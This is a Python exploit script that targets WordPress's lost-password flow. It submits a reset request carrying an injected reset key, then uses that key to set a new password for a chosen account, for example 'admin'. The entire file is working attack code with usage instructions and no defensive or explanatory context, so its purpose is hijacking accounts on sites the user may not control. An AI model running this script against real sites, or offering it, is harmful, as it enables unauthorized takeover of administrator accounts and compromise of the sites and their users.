import sys
import requests

if len(sys.argv) < 4:
    print(f"Usage: {sys.argv[0]} <target_url> <username> <newpass>")
    print(f"  e.g. {sys.argv[0]} https://example.com admin monkey123")
    sys.exit(1)

target_url = sys.argv[1].rstrip("/")
username = sys.argv[2]
newpass = sys.argv[3]
pass_param = sys.argv[4] if len(sys.argv) >= 5 else 'user_pass'
malicious_key = 'hacked'
success_string = 'Your password has been reset'

session = requests.Session()

try:

    reset_url = f"{target_url}/wp-login.php?action=lostpassword"
    data = {
        "user_login": username,
        pass_param: malicious_key,
        "wp-submit": "Get New Password"
    }

    print(f"[*] Initiating password reset for user: {username}")
    session.post(reset_url, data=data)

    reset_link = f"{target_url}/wp-login.php?action=rp&key={malicious_key}&login={username}"
    print(f"[*] Sending second request to reset password: {reset_link}")
    session.get(reset_link)

    reset_pass = f"{target_url}/wp-login.php?action=resetpass"
    reset_data = {
        "pass1": newpass,
        "pass2": newpass,
        "pw_weak": "on",
        "rp_key": malicious_key,
        "wp-submit": "Save Password"
    }

    print(f"[*] Sending POST request to set password: {newpass}")
    response = session.post(reset_pass, reset_data)

    if response.status_code == 200:
        if success_string in response.text:
            print(f"[*] Success: '{success_string}' found in response.")
        else:
            print(f"[X] Failed: Status code {response.status_code} but '{success_string}' not found in the response. Is '{username}' a valid username?")
    else:
        print(f"[X] Failed: Server returned status {response.status_code}")

except Exception as e:
    print(f"Something went wrong: {e}")